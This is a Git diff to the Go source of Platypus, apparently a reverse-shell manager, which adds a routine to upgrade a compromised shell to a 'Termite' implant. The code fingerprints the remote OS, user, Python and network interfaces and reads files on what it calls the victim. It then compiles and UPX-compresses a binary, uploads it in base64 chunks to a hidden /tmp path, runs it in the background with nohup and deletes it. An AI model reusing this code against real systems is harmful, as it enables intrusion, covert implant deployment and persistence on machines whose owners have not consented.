@@ -3,8 +3,10 @@ package context
 import (
 	"bytes"
 	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"os"
 	"strconv"
@@ -12,57 +14,48 @@ import (
 	"sync"
 	"time"
 
+	"github.com/WangYihang/Platypus/lib/util/compiler"
 	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
+	oss "github.com/WangYihang/Platypus/lib/util/os"
 	"github.com/WangYihang/Platypus/lib/util/str"
 	humanize "github.com/dustin/go-humanize"
 	"github.com/jedib0t/go-pretty/table"
+	"github.com/vbauerster/mpb/v6"
+	"github.com/vbauerster/mpb/v6/decor"
 	"golang.org/x/term"
 )
-
-type OperatingSystem int
-
-const (
-	Unknown OperatingSystem = iota
-	Linux
-	Windows
-	SunOS
-	MacOS
-	FreeBSD
-)
-
-func (os OperatingSystem) String() string {
-	return [...]string{"Unknown", "🐧", "❖", "SunOS", "🍎", "FreeBSD"}[os]
-}
 
 type TCPClient struct {
 	conn              net.Conn
 	interactive       bool
 	ptyEstablished    bool
-	GroupDispatch     bool              `json:"group_dispatch"`
-	Hash              string            `json:"hash"`
-	Host              string            `json:"host"`
-	Port              uint16            `json:"port"`
-	Alias             string            `json:"alias"`
-	User              string            `json:"user"`
-	OS                OperatingSystem   `json:"os"`
-	NetworkInterfaces map[string]string `json:"network_interfaces"`
-	Python2           string            `json:"python2"`
-	Python3           string            `json:"python3"`
-	TimeStamp         time.Time         `json:"timestamp"`
+	GroupDispatch     bool                `json:"group_dispatch"`
+	Hash              string              `json:"hash"`
+	Host              string              `json:"host"`
+	Port              uint16              `json:"port"`
+	Alias             string              `json:"alias"`
+	User              string              `json:"user"`
+	OS                oss.OperatingSystem `json:"os"`
+	NetworkInterfaces map[string]string   `json:"network_interfaces"`
+	Python2           string              `json:"python2"`
+	Python3           string              `json:"python3"`
+	TimeStamp         time.Time           `json:"timestamp"`
 	echoEnabled       bool
+	server            *TCPServer
 	readLock          *sync.Mutex
 	writeLock         *sync.Mutex
 	interacting       *sync.Mutex
 	mature            bool
 }
 
-func CreateTCPClient(conn net.Conn) *TCPClient {
+func CreateTCPClient(conn net.Conn, server *TCPServer) *TCPClient {
 	host := strings.Split(conn.RemoteAddr().String(), ":")[0]
 	port, _ := strconv.Atoi(strings.Split(conn.RemoteAddr().String(), ":")[1])
 	return &TCPClient{
 		TimeStamp:         time.Now(),
 		echoEnabled:       false,
+		server:            server,
 		conn:              conn,
 		interactive:       false,
 		ptyEstablished:    false,
@@ -72,7 +65,7 @@ func CreateTCPClient(conn net.Conn) *TCPClient {
 		Port:              uint16(port),
 		Alias:             "",
 		NetworkInterfaces: map[string]string{},
-		OS:                Unknown,
+		OS:                oss.Unknown,
 		Python2:           "",
 		Python3:           "",
 		User:              "",
@@ -167,7 +160,7 @@ func (c *TCPClient) AsTable() {
 
 func (c *TCPClient) makeHash(hashFormat string) string {
 	data := ""
-	if c.OS == Linux {
+	if c.OS == oss.Linux {
 		components := strings.Split(hashFormat, " ")
 		mapping := map[string]string{
 			"%i": strings.Split(c.conn.RemoteAddr().String(), ":")[0],
@@ -192,6 +185,8 @@ func (c *TCPClient) makeHash(hashFormat string) string {
 }
 
 func (c *TCPClient) OnelineDesc() string {
+	log.Error("%v", c)
+	log.Error("%v", c.conn)
 	addr := c.conn.RemoteAddr()
 	if c.mature {
 		return fmt.Sprintf("[%s] %s://%s [%s]", c.Hash, addr.Network(), addr.String(), c.OS.String())
@@ -335,9 +330,6 @@ func (c *TCPClient) ReadConnLock(b []byte) (int, error) {
 	c.readLock.Lock()
 	n, err := c.conn.Read(b)
 	c.readLock.Unlock()
-	if err == nil {
-		// fmt.Println("<<<", n, string(b[0:n]))
-	}
 	return n, err
 }
 
@@ -421,7 +413,7 @@ func (c *TCPClient) FileSize(filename string) (int, error) {
 
 	python := c.SelectPython()
 	if exists {
-		if c.OS == Linux {
+		if c.OS == oss.Linux {
 			if python != "" {
 				command := fmt.Sprintf(
 					"%s -c 'print(len(open(__import__(\"base64\").b64decode(b\"%s\"), \"rb\").read()))'",
@@ -435,9 +427,9 @@ func (c *TCPClient) FileSize(filename string) (int, error) {
 					return size, nil
 				}
 			} else {
-				return 0, errors.New("No python on target machine")
+				return 0, errors.New("no python on target machine")
 			}
-		} else if c.OS == Windows {
+		} else if c.OS == oss.Windows {
 			if python != "" {
 				command := fmt.Sprintf(
 					"%s -c \"print(len(open(__import__('base64').b64decode(b'%s'), 'rb').read()))\"",
@@ -451,13 +443,13 @@ func (c *TCPClient) FileSize(filename string) (int, error) {
 					return size, nil
 				}
 			} else {
-				return 0, errors.New("No python on target machine")
+				return 0, errors.New("no python on target machine")
 			}
 		} else {
-			return 0, fmt.Errorf("Unsupported OS: %s", c.OS)
+			return 0, fmt.Errorf("unsupported OS: %s", c.OS)
 		}
 	} else {
-		return 0, errors.New("No such file")
+		return 0, errors.New("no such file")
 	}
 }
 
@@ -467,7 +459,7 @@ func (c *TCPClient) ReadfileEx(filename string, start int, length int) (string, 
 		return "", err
 	}
 	if exists {
-		if c.OS == Linux {
+		if c.OS == oss.Linux {
 			if c.Python3 != "" {
 				command := fmt.Sprintf(
 					"%s -c 'f=open(__import__(\"base64\").b64decode(b\"%s\"), \"rb\");f.seek(%d);print(str(__import__(\"base64\").b64encode(f.read(%d)),encoding=\"utf-8\"));'",
@@ -492,7 +484,7 @@ func (c *TCPClient) ReadfileEx(filename string, start int, length int) (string, 
 				log.Error("No python on target machine, trying to read file using premitive method.")
 				return c.Readfile(filename)
 			}
-		} else if c.OS == Windows {
+		} else if c.OS == oss.Windows {
 			if c.Python3 != "" {
 				command := fmt.Sprintf(
 					"%s -c \"f=open(__import__('base64').b64decode(b'%s'), 'rb');f.seek(%d);print(str(__import__('base64').b64encode(f.read(%d)),encoding='utf-8'));\"",
@@ -518,11 +510,11 @@ func (c *TCPClient) ReadfileEx(filename string, start int, length int) (string, 
 				return c.Readfile(filename)
 			}
 		} else {
-			return "", fmt.Errorf("Unsupported OS: %s", c.OS)
+			return "", fmt.Errorf("unsupported OS: %s", c.OS)
 		}
 
 	} else {
-		return "", errors.New("No such file")
+		return "", errors.New("no such file")
 	}
 }
 
@@ -533,21 +525,21 @@ func (c *TCPClient) Readfile(filename string) (string, error) {
 	}
 
 	if exists {
-		if c.OS == Linux {
+		if c.OS == oss.Linux {
 			return c.SystemToken("cat " + filename), nil
 		}
 		return c.SystemToken("type " + filename), nil
 	} else {
-		return "", errors.New("No such file")
+		return "", errors.New("no such file")
 	}
 }
 
 func (c *TCPClient) FileExists(path string) (bool, error) {
 	python := c.SelectPython()
 	switch c.OS {
-	case Linux:
+	case oss.Linux:
 		return strings.TrimSpace(c.SystemToken("ls "+path)) == strings.TrimSpace(path), nil
-	case Windows:
+	case oss.Windows:
 		if python != "" {
 			// Python2 and Python3 all works fine in this situation
 			command := fmt.Sprintf(
@@ -557,10 +549,10 @@ func (c *TCPClient) FileExists(path string) (bool, error) {
 			)
 			return strings.TrimSpace(c.SystemToken(command)) == "True", nil
 		} else {
-			return false, errors.New("No python on the target machine")
+			return false, errors.New("no python on the target machine")
 		}
 	default:
-		return false, errors.New("Unrecognized operating system")
+		return false, errors.New("unrecognized operating system")
 	}
 }
 
@@ -586,13 +578,13 @@ func (c *TCPClient) EstablishPTY() error {
 		return errors.New("PTY is already established in the current client")
 	}
 
-	if c.OS == Windows {
-		return errors.New("Fully interactive PTY on Windows client is not supported")
+	if c.OS == oss.Windows {
+		return errors.New("fully interactive PTY on Windows client is not supported")
 	}
 
 	python := c.SelectPython()
 	if python == "" {
-		return errors.New("Fully interactive PTY require Python on the current client")
+		return errors.New("fully interactive PTY require Python on the current client")
 	}
 
 	// Step 1: Spawn /bin/sh via pty of victim
@@ -629,7 +621,7 @@ func (c *TCPClient) SystemToken(command string) string {
 
 	// Construct command to execute
 	// ; echo tokenB and & echo tokenB are for commands which will be execute unsuccessfully
-	if c.OS == Windows {
+	if c.OS == oss.Windows {
 		// For Windows client
 		input = "echo " + tokenA + " && " + command + " & echo " + tokenB
 	} else {
@@ -646,7 +638,7 @@ func (c *TCPClient) SystemToken(command string) string {
 	}
 
 	var isTimeout bool
-	if c.OS == Windows {
+	if c.OS == oss.Windows {
 		// For Windows client
 		_, isTimeout = c.ReadUntil(tokenA + " \r\n")
 	} else {
@@ -666,10 +658,10 @@ func (c *TCPClient) SystemToken(command string) string {
 
 func (c *TCPClient) detectUser() {
 	switch c.OS {
-	case Linux:
+	case oss.Linux:
 		c.User = strings.TrimSpace(c.SystemToken("whoami"))
 		log.Debug("[%s] User detected: %s", c.conn.RemoteAddr().String(), c.User)
-	case Windows:
+	case oss.Windows:
 		c.User = strings.TrimSpace(c.SystemToken("whoami"))
 		log.Debug("[%s] User detected: %s", c.conn.RemoteAddr().String(), c.User)
 	default:
@@ -680,7 +672,7 @@ func (c *TCPClient) detectUser() {
 func (c *TCPClient) detectPython() {
 	var result string
 	var version string
-	if c.OS == Windows {
+	if c.OS == oss.Windows {
 		// On windows platform, there is a fake python interpreter:
 		// %HOME%\AppData\Local\Microsoft\WindowsApps\python.exe
 		// The windows app store will be opened if the user didn't install python from the store
@@ -710,7 +702,7 @@ func (c *TCPClient) detectPython() {
 		} else {
 			log.Error("[%s] No python on traget machine.", c.conn.RemoteAddr().String())
 		}
-	} else if c.OS == Linux {
+	} else if c.OS == oss.Linux {
 		result = strings.TrimSpace(c.SystemToken("which python2"))
 		if result != "" {
 			c.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
@@ -727,7 +719,7 @@ func (c *TCPClient) detectPython() {
 }
 
 func (c *TCPClient) detectNetworkInterfaces() {
-	if c.OS == Linux {
+	if c.OS == oss.Linux {
 		ifnames := strings.Split(strings.TrimSpace(c.SystemToken("ls /sys/class/net")), "\n")
 		for _, ifname := range ifnames {
 			mac, err := c.Readfile(fmt.Sprintf("/sys/class/net/%s/address", ifname))
@@ -755,11 +747,11 @@ func (c *TCPClient) detectOS() {
 	}
 	output, _ := c.ReadUntil(tokenB)
 
-	kwos := map[string]OperatingSystem{
-		"linux":   Linux,
-		"sunos":   SunOS,
-		"freebsd": FreeBSD,
-		"darwin":  MacOS,
+	kwos := map[string]oss.OperatingSystem{
+		"linux":   oss.Linux,
+		"sunos":   oss.SunOS,
+		"freebsd": oss.FreeBSD,
+		"darwin":  oss.MacOS,
 	}
 	for keyword, os := range kwos {
 		if strings.Contains(strings.ToLower(output), keyword) {
@@ -779,14 +771,14 @@ func (c *TCPClient) detectOS() {
 	}
 	output, _ = c.ReadUntil(tokenB)
 	if strings.Contains(strings.ToLower(output), "windows") {
-		c.OS = Windows
+		c.OS = oss.Windows
 		log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
 		return
 	}
 
 	// Unknown OS
 	log.Error("[%s] OS detection failed, set OS = `Unknown`", c.conn.RemoteAddr().String())
-	c.OS = Unknown
+	c.OS = oss.Unknown
 }
 
 func (c *TCPClient) GatherClientInfo(hashFormat string) {
@@ -799,4 +791,184 @@ func (c *TCPClient) GatherClientInfo(hashFormat string) {
 	c.detectNetworkInterfaces()
 	c.Hash = c.makeHash(hashFormat)
 	c.mature = true
+}
+
+func (client *TCPClient) NotifyWebSocketCompilingTermite(progress int) {
+	// WebSocket Broadcast
+	type CompilingTermite struct {
+		Client     TCPClient
+		ServerHash string
+		Progress   int
+	}
+	msg, _ := json.Marshal(WebSocketMessage{
+		Type: COMPILING_TERMITE,
+		Data: CompilingTermite{
+			Client:     *client,
+			ServerHash: client.server.Hash,
+			Progress:   progress,
+		},
+	})
+	// Notify to all websocket clients
+	Ctx.NotifyWebSocket.Broadcast(msg)
+}
+
+func (client *TCPClient) NotifyWebSocketCompressingTermite(progress int) {
+	// WebSocket Broadcast
+	type CompressingTermite struct {
+		Client     TCPClient
+		ServerHash string
+		Progress   int
+	}
+	msg, _ := json.Marshal(WebSocketMessage{
+		Type: COMPRESSING_TERMITE,
+		Data: CompressingTermite{
+			Client:     *client,
+			ServerHash: client.server.Hash,
+			Progress:   progress,
+		},
+	})
+	// Notify to all websocket clients
+	Ctx.NotifyWebSocket.Broadcast(msg)
+}
+
+func (client *TCPClient) NotifyWebSocketUploadingTermite(bytesSent int, bytesTotal int) {
+	// WebSocket Broadcast
+	type UploadingTermite struct {
+		Client     TCPClient
+		ServerHash string
+		BytesSent  int
+		BytesTotal int
+	}
+	msg, _ := json.Marshal(WebSocketMessage{
+		Type: UPLOADING_TERMITE,
+		Data: UploadingTermite{
+			Client:     *client,
+			ServerHash: client.server.Hash,
+			BytesSent:  bytesSent,
+			BytesTotal: bytesTotal,
+		},
+	})
+	// Notify to all websocket clients
+	Ctx.NotifyWebSocket.Broadcast(msg)
+}
+
+func (c *TCPClient) UpgradeToTermite() {
+	if c.OS == oss.Windows {
+		// TODO: Windows Upgrade
+		log.Error("Upgrade to Termite on Windows client is not supported")
+		return
+	}
+
+	// Compiler termite binary
+	target := fmt.Sprintf("build/%s-%s-termite", time.Now().Format("2006-01-02-15:04:05"), str.RandomString(0x10))
+	// Step 1: Build Termite Binary
+	c.NotifyWebSocketCompilingTermite(0)
+	if compiler.Compile(target) {
+		c.NotifyWebSocketCompilingTermite(100)
+	} else {
+		c.NotifyWebSocketCompilingTermite(-1)
+	}
+
+	// Step 2: Upx compression
+	c.NotifyWebSocketCompressingTermite(0)
+	if compiler.Compress(target) {
+		c.NotifyWebSocketCompressingTermite(100)
+	} else {
+		c.NotifyWebSocketCompressingTermite(-1)
+	}
+
+	// Upload Termite Binary
+	dst := fmt.Sprintf("/tmp/.%s", str.RandomString(0x10))
+	if !c.Upload(target, dst, true) {
+		log.Error("Upload failed")
+		return
+	}
+
+	// Execute Termite Binary
+	c.SystemToken(fmt.Sprintf("/usr/bin/chmod +x %s", dst))
+	c.System(fmt.Sprintf("/usr/bin/nohup /bin/bash -c '%s; /usr/bin/rm %s' >/dev/null &", dst, dst))
+}
+
+func (c *TCPClient) Upload(src string, dst string, broadcast bool) bool {
+	// Check existance of remote path
+	dstExists, err := c.FileExists(dst)
+	if err != nil {
+		log.Error(err.Error())
+		return false
+	}
+
+	if dstExists {
+		log.Error("The target path is occupied, please select another destination")
+		return false
+	}
+
+	// Read local file content
+	content, err := ioutil.ReadFile(src)
+	if err != nil {
+		log.Error(err.Error())
+		return false
+	}
+
+	log.Info("Uploading %s to %s", src, dst)
+
+	// 1k Segment
+	segmentSize := 0x1000
+
+	bytesSent := 0
+	totalBytes := len(content)
+
+	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
+
+	segments := totalBytes / segmentSize
+	overflowedBytes := totalBytes - segments*segmentSize
+
+	p := mpb.New(
+		mpb.WithWidth(64),
+	)
+
+	bar := p.Add(int64(totalBytes), mpb.NewBarFiller("[=>-|"),
+		mpb.PrependDecorators(
+			decor.CountersKibiByte("% .2f / % .2f"),
+		),
+		mpb.AppendDecorators(
+			decor.EwmaETA(decor.ET_STYLE_HHMMSS, 60),
+			decor.Name(" ] "),
+			decor.EwmaSpeed(decor.UnitKB, "% .2f", 60),
+		),
+	)
+
+	// Firstly, use redirect `>` to create file, and write the overflowed bytes
+	start := time.Now()
+	c.SystemToken(fmt.Sprintf(
+		"echo %s| base64 -d > %s",
+		base64.StdEncoding.EncodeToString(content[0:overflowedBytes]),
+		dst,
+	))
+
+	bar.IncrBy(overflowedBytes)
+
+	bytesSent += overflowedBytes
+	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
+
+	bar.DecoratorEwmaUpdate(time.Since(start))
+
+	// Secondly, use `>>` to append all segments left except the final one
+	for i := 0; i < segments; i++ {
+		start = time.Now()
+		c.SystemToken(fmt.Sprintf(
+			"echo %s| base64 -d >> %s",
+			base64.StdEncoding.EncodeToString(content[overflowedBytes+i*segmentSize:overflowedBytes+(i+1)*segmentSize]),
+			dst,
+		))
+		bytesSent += segmentSize
+		bar.IncrBy(segmentSize)
+		bar.DecoratorEwmaUpdate(time.Since(start))
+
+		if broadcast && i%64 == 0 {
+			c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
+		}
+	}
+	p.Wait()
+	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
+	return true
 }
